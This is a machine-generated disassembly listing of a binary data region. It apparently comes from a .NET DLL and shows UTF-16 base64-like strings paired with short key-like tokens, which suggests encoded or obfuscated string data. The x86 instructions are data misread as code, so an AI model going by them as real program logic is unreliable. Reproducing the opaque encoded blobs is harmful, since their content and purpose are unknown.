10004096:	7a 00                	jp     0x10004098
10004098:	57                   	push   %edi
10004099:	00 57 00             	add    %dl,0x0(%edi)
1000409c:	39 00                	cmp    %eax,(%eax)
1000409e:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
100040a2:	55                   	push   %ebp
100040a3:	00 35 00 42 00 52    	add    %dh,0x52004200
100040a9:	00 47 00             	add    %al,0x0(%edi)
100040ac:	55                   	push   %ebp
100040ad:	00 78 00             	add    %bh,0x0(%eax)
100040b0:	4d                   	dec    %ebp
100040b1:	00 31                	add    %dh,(%ecx)
100040b3:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
100040b7:	00 59 00             	add    %bl,0x0(%ecx)
100040ba:	6b 00 64             	imul   $0x64,(%eax),%eax
100040bd:	00 76 00             	add    %dh,0x0(%esi)
100040c0:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
100040c4:	56                   	push   %esi
100040c5:	00 4f 00             	add    %cl,0x0(%edi)
100040c8:	51                   	push   %ecx
100040c9:	00 55 00             	add    %dl,0x0(%ebp)
100040cc:	52                   	push   %edx
100040cd:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
100040d1:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
100040d5:	00 5a 00             	add    %bl,0x0(%edx)
100040d8:	62 00                	bound  %eax,(%eax)
100040da:	33 00                	xor    (%eax),%eax
100040dc:	70 00                	jo     0x100040de
100040de:	46                   	inc    %esi
100040df:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100040e3:	00 46 00             	add    %al,0x0(%esi)
100040e6:	45                   	inc    %ebp
100040e7:	00 5a 00             	add    %bl,0x0(%edx)
100040ea:	54                   	push   %esp
100040eb:	00 45 00             	add    %al,0x0(%ebp)
100040ee:	7a 00                	jp     0x100040f0
100040f0:	57                   	push   %edi
100040f1:	00 56 00             	add    %dl,0x0(%esi)
100040f4:	5a                   	pop    %edx
100040f5:	00 35 00 62 00 33    	add    %dh,0x33006200
100040fb:	00 70 00             	add    %dh,0x0(%eax)
100040fe:	46                   	inc    %esi
100040ff:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004103:	00 46 00             	add    %al,0x0(%esi)
10004106:	45                   	inc    %ebp
10004107:	00 5a 00             	add    %bl,0x0(%edx)
1000410a:	54                   	push   %esp
1000410b:	00 45 00             	add    %al,0x0(%ebp)
1000410e:	7a 00                	jp     0x10004110
10004110:	57                   	push   %edi
10004111:	00 51 00             	add    %dl,0x0(%ecx)
10004114:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004119:	15 6f 00 7a 00       	adc    $0x7a006f,%eax
1000411e:	45                   	inc    %ebp
1000411f:	00 4e 00             	add    %cl,0x0(%esi)
10004122:	41                   	inc    %ecx
10004123:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
10004127:	00 31                	add    %dh,(%ecx)
10004129:	00 33                	add    %dh,(%ebx)
1000412b:	00 59 00             	add    %bl,0x0(%ecx)
1000412e:	00 80 b9 56 00 45    	add    %al,0x450056b9(%eax)
10004134:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10004138:	00 61 00             	add    %ah,0x0(%ecx)
1000413b:	6d                   	insl   (%dx),%es:(%edi)
1000413c:	00 4e 00             	add    %cl,0x0(%esi)
1000413f:	73 00                	jae    0x10004141
10004141:	55                   	push   %ebp
10004142:	00 7a 00             	add    %bh,0x0(%edx)
10004145:	46                   	inc    %esi
10004146:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
1000414a:	00 56 00             	add    %dl,0x0(%esi)
1000414d:	56                   	push   %esi
1000414e:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
10004152:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004156:	00 48 00             	add    %cl,0x0(%eax)
10004159:	52                   	push   %edx
1000415a:	00 32                	add    %dh,(%edx)
1000415c:	00 70 00             	add    %dh,0x0(%eax)
1000415f:	6a 00                	push   $0x0
10004161:	62 00                	bound  %eax,(%eax)
10004163:	46                   	inc    %esi
10004164:	00 4d 00             	add    %cl,0x0(%ebp)
10004167:	78 00                	js     0x10004169
10004169:	62 00                	bound  %eax,(%eax)
1000416b:	54                   	push   %esp
1000416c:	00 46 00             	add    %al,0x0(%esi)
1000416f:	55                   	push   %ebp
10004170:	00 52 00             	add    %dl,0x0(%edx)
10004173:	30 00                	xor    %al,(%eax)
10004175:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
10004179:	59                   	pop    %ecx
1000417a:	00 32                	add    %dh,(%edx)
1000417c:	00 78 00             	add    %bh,0x0(%eax)
1000417f:	54                   	push   %esp
10004180:	00 4d 00             	add    %cl,0x0(%ebp)
10004183:	57                   	push   %edi
10004184:	00 30                	add    %dh,(%eax)
10004186:	00 78 00             	add    %bh,0x0(%eax)
10004189:	62 00                	bound  %eax,(%eax)
1000418b:	6c                   	insb   (%dx),%es:(%edi)
1000418c:	00 46 00             	add    %al,0x0(%esi)
1000418f:	59                   	pop    %ecx
10004190:	00 56 00             	add    %dl,0x0(%esi)
10004193:	45                   	inc    %ebp
10004194:	00 64 00 48          	add    %ah,0x48(%eax,%eax,1)
10004198:	00 61 00             	add    %ah,0x0(%ecx)
1000419b:	6d                   	insl   (%dx),%es:(%edi)
1000419c:	00 4e 00             	add    %cl,0x0(%esi)
1000419f:	73 00                	jae    0x100041a1
100041a1:	55                   	push   %ebp
100041a2:	00 7a 00             	add    %bh,0x0(%edx)
100041a5:	46                   	inc    %esi
100041a6:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
100041aa:	00 56 00             	add    %dl,0x0(%esi)
100041ad:	52                   	push   %edx
100041ae:	00 48 00             	add    %cl,0x0(%eax)
100041b1:	52                   	push   %edx
100041b2:	00 32                	add    %dh,(%edx)
100041b4:	00 70 00             	add    %dh,0x0(%eax)
100041b7:	6a 00                	push   $0x0
100041b9:	62 00                	bound  %eax,(%eax)
100041bb:	46                   	inc    %esi
100041bc:	00 4d 00             	add    %cl,0x0(%ebp)
100041bf:	78 00                	js     0x100041c1
100041c1:	62 00                	bound  %eax,(%eax)
100041c3:	54                   	push   %esp
100041c4:	00 46 00             	add    %al,0x0(%esi)
100041c7:	4f                   	dec    %edi
100041c8:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
100041cc:	00 52 00             	add    %dl,0x0(%edx)
100041cf:	48                   	dec    %eax
100041d0:	00 52 00             	add    %dl,0x0(%edx)
100041d3:	32 00                	xor    (%eax),%al
100041d5:	70 00                	jo     0x100041d7
100041d7:	6a 00                	push   $0x0
100041d9:	62 00                	bound  %eax,(%eax)
100041db:	46                   	inc    %esi
100041dc:	00 4d 00             	add    %cl,0x0(%ebp)
100041df:	78 00                	js     0x100041e1
100041e1:	62 00                	bound  %eax,(%eax)
100041e3:	54                   	push   %esp
100041e4:	00 45 00             	add    %al,0x0(%ebp)
100041e7:	3d 00 00 15 54       	cmp    $0x54150000,%eax
100041ec:	00 47 00             	add    %al,0x0(%edi)
100041ef:	47                   	inc    %edi
100041f0:	00 6a 00             	add    %ch,0x0(%edx)
100041f3:	63 00                	arpl   %eax,(%eax)
100041f5:	6c                   	insb   (%dx),%es:(%edi)
100041f6:	00 53 00             	add    %dl,0x0(%ebx)
100041f9:	31 00                	xor    %eax,(%eax)
100041fb:	6d                   	insl   (%dx),%es:(%edi)
100041fc:	00 31                	add    %dh,(%ecx)
100041fe:	00 00                	add    %al,(%eax)
10004200:	80 b9 54 00 44 00 4e 	cmpb   $0x4e,0x440054(%ecx)
10004207:	00 45 00             	add    %al,0x0(%ebp)
1000420a:	57                   	push   %edi
1000420b:	00 6d 00             	add    %ch,0x0(%ebp)
1000420e:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10004212:	56                   	push   %esi
10004213:	00 30                	add    %dh,(%eax)
10004215:	00 78 00             	add    %bh,0x0(%eax)
10004218:	34 00                	xor    $0x0,%al
1000421a:	65 00 47 00          	add    %al,%gs:0x0(%edi)
1000421e:	46                   	inc    %esi
1000421f:	00 58 00             	add    %bl,0x0(%eax)
10004222:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
10004226:	77 00                	ja     0x10004228
10004228:	7a 00                	jp     0x1000422a
1000422a:	52                   	push   %edx
1000422b:	00 46 00             	add    %al,0x0(%esi)
1000422e:	70 00                	jo     0x10004230
10004230:	6e                   	outsb  %ds:(%esi),(%dx)
10004231:	00 59 00             	add    %bl,0x0(%ecx)
10004234:	6c                   	insb   (%dx),%es:(%edi)
10004235:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
10004239:	00 65 00             	add    %ah,0x0(%ebp)
1000423c:	48                   	dec    %eax
1000423d:	00 68 00             	add    %ch,0x0(%eax)
10004240:	4d                   	dec    %ebp
10004241:	00 4d 00             	add    %cl,0x0(%ebp)
10004244:	30 00                	xor    %al,(%eax)
10004246:	52                   	push   %edx
10004247:	00 61 00             	add    %ah,0x0(%ecx)
1000424a:	5a                   	pop    %edx
1000424b:	00 32                	add    %dh,(%edx)
1000424d:	00 4a 00             	add    %cl,0x0(%edx)
10004250:	58                   	pop    %eax
10004251:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
10004255:	00 68 00             	add    %ch,0x0(%eax)
10004258:	34 00                	xor    $0x0,%al
1000425a:	61                   	popa
1000425b:	00 47 00             	add    %al,0x0(%edi)
1000425e:	4d                   	dec    %ebp
1000425f:	00 79 00             	add    %bh,0x0(%ecx)
10004262:	54                   	push   %esp
10004263:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
10004267:	00 45 00             	add    %al,0x0(%ebp)
1000426a:	57                   	push   %edi
1000426b:	00 6d 00             	add    %ch,0x0(%ebp)
1000426e:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
10004272:	56                   	push   %esi
10004273:	00 30                	add    %dh,(%eax)
10004275:	00 78 00             	add    %bh,0x0(%eax)
10004278:	34 00                	xor    $0x0,%al
1000427a:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
1000427e:	77 00                	ja     0x10004280
10004280:	7a 00                	jp     0x10004282
10004282:	52                   	push   %edx
10004283:	00 46 00             	add    %al,0x0(%esi)
10004286:	70 00                	jo     0x10004288
10004288:	6e                   	outsb  %ds:(%esi),(%dx)
10004289:	00 59 00             	add    %bl,0x0(%ecx)
1000428c:	6c                   	insb   (%dx),%es:(%edi)
1000428d:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
10004291:	00 65 00             	add    %ah,0x0(%ebp)
10004294:	48                   	dec    %eax
10004295:	00 67 00             	add    %ah,0x0(%edi)
10004298:	77 00                	ja     0x1000429a
1000429a:	50                   	push   %eax
1000429b:	00 55 00             	add    %dl,0x0(%ebp)
1000429e:	77 00                	ja     0x100042a0
100042a0:	7a 00                	jp     0x100042a2
100042a2:	52                   	push   %edx
100042a3:	00 46 00             	add    %al,0x0(%esi)
100042a6:	70 00                	jo     0x100042a8
100042a8:	6e                   	outsb  %ds:(%esi),(%dx)
100042a9:	00 59 00             	add    %bl,0x0(%ecx)
100042ac:	6c                   	insb   (%dx),%es:(%edi)
100042ad:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
100042b1:	00 65 00             	add    %ah,0x0(%ebp)
100042b4:	48                   	dec    %eax
100042b5:	00 67 00             	add    %ah,0x0(%edi)
100042b8:	3d 00 00 15 4c       	cmp    $0x4c150000,%eax
100042bd:	00 33                	add    %dh,(%ebx)
100042bf:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
100042c3:	00 67 00             	add    %ah,0x0(%edi)
100042c6:	62 00                	bound  %eax,(%eax)
100042c8:	57                   	push   %edi
100042c9:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
100042cd:	00 78 00             	add    %bh,0x0(%eax)
100042d0:	00 80 f9 4d 00 44    	add    %al,0x44004df9(%eax)
100042d6:	00 52 00             	add    %dl,0x0(%edx)
100042d9:	48                   	dec    %eax
100042da:	00 5a 00             	add    %bl,0x0(%edx)
100042dd:	6a 00                	push   $0x0
100042df:	51                   	push   %ecx
100042e0:	00 31                	add    %dh,(%ecx)
100042e2:	00 55 00             	add    %dl,0x0(%ebp)
100042e5:	46                   	inc    %esi
100042e6:	00 46 00             	add    %al,0x0(%esi)
100042e9:	4b                   	dec    %ebx
100042ea:	00 4e 00             	add    %cl,0x0(%esi)
100042ed:	46                   	inc    %esi
100042ee:	00 46 00             	add    %al,0x0(%esi)
100042f1:	59                   	pop    %ecx
100042f2:	00 51 00             	add    %dl,0x0(%ecx)
100042f5:	6a 00                	push   $0x0
100042f7:	41                   	inc    %ecx
100042f8:	00 30                	add    %dh,(%eax)
100042fa:	00 52 00             	add    %dl,0x0(%edx)
100042fd:	32 00                	xor    (%eax),%al
100042ff:	59                   	pop    %ecx
10004300:	00 30                	add    %dh,(%eax)
10004302:	00 4e 00             	add    %cl,0x0(%esi)
10004305:	56                   	push   %esi
10004306:	00 42 00             	add    %al,0x0(%edx)
10004309:	52                   	push   %edx
1000430a:	00 53 00             	add    %dl,0x0(%ebx)
1000430d:	6a 00                	push   $0x0
1000430f:	51                   	push   %ecx
10004310:	00 77 00             	add    %dh,0x0(%edi)
10004313:	4e                   	dec    %esi
10004314:	00 45 00             	add    %al,0x0(%ebp)
10004317:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000431b:	4e                   	dec    %esi
1000431c:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10004320:	00 51 00             	add    %dl,0x0(%ecx)
10004323:	55                   	push   %ebp
10004324:	00 55 00             	add    %dl,0x0(%ebp)
10004327:	6f                   	outsl  %ds:(%esi),(%dx)
10004328:	00 30                	add    %dh,(%eax)
1000432a:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
1000432e:	00 52 00             	add    %dl,0x0(%edx)
10004331:	48                   	dec    %eax
10004332:	00 4d 00             	add    %cl,0x0(%ebp)
10004335:	44                   	inc    %esp
10004336:	00 52 00             	add    %dl,0x0(%edx)
10004339:	48                   	dec    %eax
1000433a:	00 5a 00             	add    %bl,0x0(%edx)
1000433d:	6a 00                	push   $0x0
1000433f:	51                   	push   %ecx
10004340:	00 31                	add    %dh,(%ecx)
10004342:	00 55 00             	add    %dl,0x0(%ebp)
10004345:	46                   	inc    %esi
10004346:	00 46 00             	add    %al,0x0(%esi)
10004349:	4b                   	dec    %ebx
1000434a:	00 4e 00             	add    %cl,0x0(%esi)
1000434d:	44                   	inc    %esp
1000434e:	00 41 00             	add    %al,0x0(%ecx)
10004351:	30 00                	xor    %al,(%eax)
10004353:	52                   	push   %edx
10004354:	00 32                	add    %dh,(%edx)
10004356:	00 59 00             	add    %bl,0x0(%ecx)
10004359:	30 00                	xor    %al,(%eax)
1000435b:	4e                   	dec    %esi
1000435c:	00 56 00             	add    %dl,0x0(%esi)
1000435f:	42                   	inc    %edx
10004360:	00 52 00             	add    %dl,0x0(%edx)
10004363:	53                   	push   %ebx
10004364:	00 6a 00             	add    %ch,0x0(%edx)
10004367:	52                   	push   %edx
10004368:	00 47 00             	add    %al,0x0(%edi)
1000436b:	4d                   	dec    %ebp
1000436c:	00 57 00             	add    %dl,0x0(%edi)
1000436f:	49                   	dec    %ecx
10004370:	00 77 00             	add    %dh,0x0(%edi)
10004373:	4e                   	dec    %esi
10004374:	00 45 00             	add    %al,0x0(%ebp)
10004377:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
1000437b:	4e                   	dec    %esi
1000437c:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
10004380:	00 51 00             	add    %dl,0x0(%ecx)
10004383:	55                   	push   %ebp
10004384:	00 55 00             	add    %dl,0x0(%ebp)
10004387:	6f                   	outsl  %ds:(%esi),(%dx)
10004388:	00 30                	add    %dh,(%eax)
1000438a:	00 4d 00             	add    %cl,0x0(%ebp)
1000438d:	44                   	inc    %esp
1000438e:	00 52 00             	add    %dl,0x0(%edx)
10004391:	48                   	dec    %eax
10004392:	00 5a 00             	add    %bl,0x0(%edx)
10004395:	6a 00                	push   $0x0
10004397:	51                   	push   %ecx
10004398:	00 31                	add    %dh,(%ecx)
1000439a:	00 55 00             	add    %dl,0x0(%ebp)
1000439d:	46                   	inc    %esi
1000439e:	00 46 00             	add    %al,0x0(%esi)
100043a1:	4b                   	dec    %ebx
100043a2:	00 4e 00             	add    %cl,0x0(%esi)
100043a5:	47                   	inc    %edi
100043a6:	00 31                	add    %dh,(%ecx)
100043a8:	00 4f 00             	add    %cl,0x0(%edi)
100043ab:	62 00                	bound  %eax,(%eax)
100043ad:	7a 00                	jp     0x100043af
100043af:	41                   	inc    %ecx
100043b0:	00 30                	add    %dh,(%eax)
100043b2:	00 52 00             	add    %dl,0x0(%edx)
100043b5:	32 00                	xor    (%eax),%al
100043b7:	59                   	pop    %ecx
100043b8:	00 30                	add    %dh,(%eax)
100043ba:	00 4e 00             	add    %cl,0x0(%esi)
100043bd:	56                   	push   %esi
100043be:	00 42 00             	add    %al,0x0(%edx)
100043c1:	52                   	push   %edx
100043c2:	00 53 00             	add    %dl,0x0(%ebx)
100043c5:	6a 00                	push   $0x0
100043c7:	51                   	push   %ecx
100043c8:	00 3d 00 00 15 30    	add    %bh,0x30150000
100043ce:	00 34 00             	add    %dh,(%eax,%eax,1)
100043d1:	47                   	inc    %edi
100043d2:	00 66 00             	add    %ah,0x0(%esi)
100043d5:	34 00                	xor    $0x0,%al
100043d7:	35 00 50 00 51       	xor    $0x51005000,%eax
100043dc:	00 4a 00             	add    %cl,0x0(%edx)
100043df:	34 00                	xor    $0x0,%al
100043e1:	00 79 51             	add    %bh,0x51(%ecx)
100043e4:	00 58 00             	add    %bl,0x0(%eax)
100043e7:	4a                   	dec    %edx
100043e8:	00 6d 00             	add    %ch,0x0(%ebp)
100043eb:	62 00                	bound  %eax,(%eax)
100043ed:	57                   	push   %edi
100043ee:	00 52 00             	add    %dl,0x0(%edx)
100043f1:	6c                   	insb   (%dx),%es:(%edi)
100043f2:	00 59 00             	add    %bl,0x0(%ecx)
100043f5:	6b 00 39             	imul   $0x39,(%eax),%eax
100043f8:	00 6f 00             	add    %ch,0x0(%edi)
100043fb:	51                   	push   %ecx
100043fc:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
10004400:	00 7a 00             	add    %bh,0x0(%edx)
10004403:	54                   	push   %esp
10004404:	00 6b 00             	add    %ch,0x0(%ebx)
10004407:	46                   	inc    %esi
10004408:	00 79 00             	add    %bh,0x0(%ecx)
1000440b:	5a                   	pop    %edx
1000440c:	00 6d 00             	add    %ch,0x0(%ebp)
1000440f:	31 00                	xor    %eax,(%eax)
10004411:	6b 00 5a             	imul   $0x5a,(%eax),%eax
10004414:	00 57 00             	add    %dl,0x0(%edi)
10004417:	4a                   	dec    %edx
10004418:	00 50 00             	add    %dl,0x0(%eax)
1000441b:	61                   	popa
1000441c:	00 45 00             	add    %al,0x0(%ebp)
1000441f:	4a                   	dec    %edx
10004420:	00 42 00             	add    %al,0x0(%edx)
10004423:	63 00                	arpl   %eax,(%eax)
10004425:	6d                   	insl   (%dx),%es:(%edi)
10004426:	00 5a 00             	add    %bl,0x0(%edx)
10004429:	74 00                	je     0x1000442b
1000442b:	5a                   	pop    %edx
1000442c:	00 47 00             	add    %al,0x0(%edi)
1000442f:	56                   	push   %esi
10004430:	00 69 00             	add    %ch,0x0(%ecx)
10004433:	54                   	push   %esp
10004434:	00 32                	add    %dh,(%edx)
10004436:	00 68 00             	add    %ch,0x0(%eax)
10004439:	43                   	inc    %ebx
1000443a:	00 61 00             	add    %ah,0x0(%ecx)
1000443d:	6b 00 46             	imul   $0x46,(%eax),%eax
10004440:	00 79 00             	add    %bh,0x0(%ecx)
10004443:	5a                   	pop    %edx
10004444:	00 6d 00             	add    %ch,0x0(%ebp)
10004447:	31 00                	xor    %eax,(%eax)
10004449:	6b 00 5a             	imul   $0x5a,(%eax),%eax
1000444c:	00 57 00             	add    %dl,0x0(%edi)
1000444f:	4a                   	dec    %edx
10004450:	00 50 00             	add    %dl,0x0(%eax)
10004453:	61                   	popa
10004454:	00 45 00             	add    %al,0x0(%ebp)
10004457:	49                   	dec    %ecx
10004458:	00 3d 00 00 15 41    	add    %bh,0x41150000
1000445e:	00 72 00             	add    %dh,0x0(%edx)
10004461:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
10004465:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
10004469:	62 00                	bound  %eax,(%eax)
1000446b:	4f                   	dec    %edi
1000446c:	00 68 00             	add    %ch,0x0(%eax)
1000446f:	42                   	inc    %edx
10004470:	00 00                	add    %al,(%eax)
10004472:	81 71 65 00 57 00 31 	xorl   $0x31005700,0x65(%ecx)
10004479:	00 72 00             	add    %dh,0x0(%edx)
1000447c:	64 00 6c 00 68       	add    %ch,%fs:0x68(%eax,%eax,1)
10004481:	00 5a 00             	add    %bl,0x0(%edx)
10004484:	57                   	push   %edi
10004485:	00 45 00             	add    %al,0x0(%ebp)
10004488:	31 00                	xor    %eax,(%eax)
1000448a:	49                   	dec    %ecx
1000448b:	00 52 00             	add    %dl,0x0(%edx)
1000448e:	56                   	push   %esi
1000448f:	00 4e 00             	add    %cl,0x0(%esi)
10004492:	58                   	pop    %eax
10004493:	00 4e 00             	add    %cl,0x0(%esi)
10004496:	58                   	pop    %eax
10004497:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
1000449b:	00 61 00             	add    %ah,0x0(%ecx)
1000449e:	33 00                	xor    (%eax),%eax
100044a0:	5a                   	pop    %edx
100044a1:	00 59 00             	add    %bl,0x0(%ecx)
100044a4:	57                   	push   %edi
100044a5:	00 56 00             	add    %dl,0x0(%esi)
100044a8:	68 00 4e 00 53       	push   $0x53004e00
100044ad:	00 45 00             	add    %al,0x0(%ebp)
100044b0:	56                   	push   %esi
100044b1:	00 35 00 62 00 57    	add    %dh,0x57006200
100044b7:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
100044bb:	00 57 00             	add    %dl,0x0(%edi)
100044be:	46                   	inc    %esi
100044bf:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
100044c3:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
100044c7:	00 68 00             	add    %ch,0x0(%eax)
100044ca:	46                   	inc    %esi
100044cb:	00 65 00             	add    %ah,0x0(%ebp)
100044ce:	6d                   	insl   (%dx),%es:(%edi)
100044cf:	00 52 00             	add    %dl,0x0(%edx)
100044d2:	48                   	dec    %eax
100044d3:	00 65 00             	add    %ah,0x0(%ebp)
100044d6:	57                   	push   %edi
100044d7:	00 31                	add    %dh,(%ecx)
100044d9:	00 72 00             	add    %dh,0x0(%edx)
100044dc:	64 00 6c 00 68       	add    %ch,%fs:0x68(%eax,%eax,1)
100044e1:	00 5a 00             	add    %bl,0x0(%edx)
100044e4:	57                   	push   %edi
100044e5:	00 45 00             	add    %al,0x0(%ebp)
100044e8:	31 00                	xor    %eax,(%eax)
100044ea:	49                   	dec    %ecx
100044eb:	00 52 00             	add    %dl,0x0(%edx)
100044ee:	58                   	pop    %eax
100044ef:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
100044f3:	00 61 00             	add    %ah,0x0(%ecx)
100044f6:	33 00                	xor    (%eax),%eax
100044f8:	5a                   	pop    %edx
100044f9:	00 59 00             	add    %bl,0x0(%ecx)
100044fc:	57                   	push   %edi
100044fd:	00 56 00             	add    %dl,0x0(%esi)
10004500:	68 00 4e 00 53       	push   $0x53004e00
10004505:	00 45 00             	add    %al,0x0(%ebp)
10004508:	56                   	push   %esi
10004509:	00 47 00             	add    %al,0x0(%edi)
1000450c:	63 00                	arpl   %eax,(%eax)
1000450e:	32 00                	xor    (%eax),%al
10004510:	4a                   	dec    %edx
10004511:	00 35 00 62 00 57    	add    %dh,0x57006200
10004517:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
1000451b:	00 57 00             	add    %dl,0x0(%edi)
1000451e:	46                   	inc    %esi
1000451f:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10004523:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004527:	00 68 00             	add    %ch,0x0(%eax)
1000452a:	46                   	inc    %esi
1000452b:	00 65 00             	add    %ah,0x0(%ebp)
1000452e:	57                   	push   %edi
1000452f:	00 31                	add    %dh,(%ecx)
10004531:	00 72 00             	add    %dh,0x0(%edx)
10004534:	64 00 6c 00 68       	add    %ch,%fs:0x68(%eax,%eax,1)
10004539:	00 5a 00             	add    %bl,0x0(%edx)
1000453c:	57                   	push   %edi
1000453d:	00 45 00             	add    %al,0x0(%ebp)
10004540:	31 00                	xor    %eax,(%eax)
10004542:	49                   	dec    %ecx
10004543:	00 52 00             	add    %dl,0x0(%edx)
10004546:	55                   	push   %ebp
10004547:	00 5a 00             	add    %bl,0x0(%edx)
1000454a:	57                   	push   %edi
1000454b:	00 4d 00             	add    %cl,0x0(%ebp)
1000454e:	48                   	dec    %eax
1000454f:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
10004553:	00 61 00             	add    %ah,0x0(%ecx)
10004556:	33 00                	xor    (%eax),%eax
10004558:	5a                   	pop    %edx
10004559:	00 59 00             	add    %bl,0x0(%ecx)
1000455c:	57                   	push   %edi
1000455d:	00 56 00             	add    %dl,0x0(%esi)
10004560:	68 00 4e 00 53       	push   $0x53004e00
10004565:	00 45 00             	add    %al,0x0(%ebp)
10004568:	56                   	push   %esi
10004569:	00 35 00 62 00 57    	add    %dh,0x57006200
1000456f:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
10004573:	00 57 00             	add    %dl,0x0(%edi)
10004576:	46                   	inc    %esi
10004577:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
1000457b:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
1000457f:	00 68 00             	add    %ch,0x0(%eax)
10004582:	46                   	inc    %esi
10004583:	00 59 00             	add    %bl,0x0(%ecx)
10004586:	56                   	push   %esi
10004587:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
1000458b:	00 65 00             	add    %ah,0x0(%ebp)
1000458e:	57                   	push   %edi
1000458f:	00 31                	add    %dh,(%ecx)
10004591:	00 72 00             	add    %dh,0x0(%edx)
10004594:	64 00 6c 00 68       	add    %ch,%fs:0x68(%eax,%eax,1)
10004599:	00 5a 00             	add    %bl,0x0(%edx)
1000459c:	57                   	push   %edi
1000459d:	00 45 00             	add    %al,0x0(%ebp)
100045a0:	31 00                	xor    %eax,(%eax)
100045a2:	49                   	dec    %ecx
100045a3:	00 52 00             	add    %dl,0x0(%edx)
100045a6:	58                   	pop    %eax
100045a7:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
100045ab:	00 61 00             	add    %ah,0x0(%ecx)
100045ae:	33 00                	xor    (%eax),%eax
100045b0:	5a                   	pop    %edx
100045b1:	00 59 00             	add    %bl,0x0(%ecx)
100045b4:	57                   	push   %edi
100045b5:	00 56 00             	add    %dl,0x0(%esi)
100045b8:	68 00 4e 00 53       	push   $0x53004e00
100045bd:	00 45 00             	add    %al,0x0(%ebp)
100045c0:	55                   	push   %ebp
100045c1:	00 39                	add    %bh,(%ecx)
100045c3:	00 65 00             	add    %ah,0x0(%ebp)
100045c6:	57                   	push   %edi
100045c7:	00 31                	add    %dh,(%ecx)
100045c9:	00 72 00             	add    %dh,0x0(%edx)
100045cc:	64 00 6c 00 68       	add    %ch,%fs:0x68(%eax,%eax,1)
100045d1:	00 5a 00             	add    %bl,0x0(%edx)
100045d4:	57                   	push   %edi
100045d5:	00 45 00             	add    %al,0x0(%ebp)
100045d8:	31 00                	xor    %eax,(%eax)
100045da:	49                   	dec    %ecx
100045db:	00 52 00             	add    %dl,0x0(%edx)
100045de:	51                   	push   %ecx
100045df:	00 3d 00 3d 00 00    	add    %bh,0x3d00
100045e5:	15 79 00 6d 00       	adc    $0x6d0079,%eax
100045ea:	6b 00 76             	imul   $0x76,(%eax),%eax
100045ed:	00 58 00             	add    %bl,0x0(%eax)
100045f0:	59                   	pop    %ecx
100045f1:	00 58 00             	add    %bl,0x0(%eax)
100045f4:	4d                   	dec    %ebp
100045f5:	00 48 00             	add    %cl,0x0(%eax)
100045f8:	45                   	inc    %ebp
100045f9:	00 00                	add    %al,(%eax)
100045fb:	80 f9 53             	cmp    $0x53,%cl
100045fe:	00 32                	add    %dh,(%edx)
10004600:	00 68 00             	add    %ch,0x0(%eax)
10004603:	53                   	push   %ebx
10004604:	00 56 00             	add    %dl,0x0(%esi)
10004607:	47                   	inc    %edi
10004608:	00 59 00             	add    %bl,0x0(%ecx)
1000460b:	30 00                	xor    %al,(%eax)
1000460d:	52                   	push   %edx
1000460e:	00 32                	add    %dh,(%edx)
10004610:	00 68 00             	add    %ch,0x0(%eax)
10004613:	6a 00                	push   $0x0
10004615:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004619:	4a                   	dec    %edx
1000461a:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
1000461e:	00 45 00             	add    %al,0x0(%ebp)
10004621:	74 00                	je     0x10004623
10004623:	6f                   	outsl  %ds:(%esi),(%dx)
10004624:	00 55 00             	add    %dl,0x0(%ebp)
10004627:	6c                   	insb   (%dx),%es:(%edi)
10004628:	00 52 00             	add    %dl,0x0(%edx)
1000462b:	6d                   	insl   (%dx),%es:(%edi)
1000462c:	00 4e 00             	add    %cl,0x0(%esi)
1000462f:	45                   	inc    %ebp
10004630:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
10004634:	00 59 00             	add    %bl,0x0(%ecx)
10004637:	33 00                	xor    (%eax),%eax
10004639:	70 00                	jo     0x1000463b
1000463b:	4c                   	dec    %esp
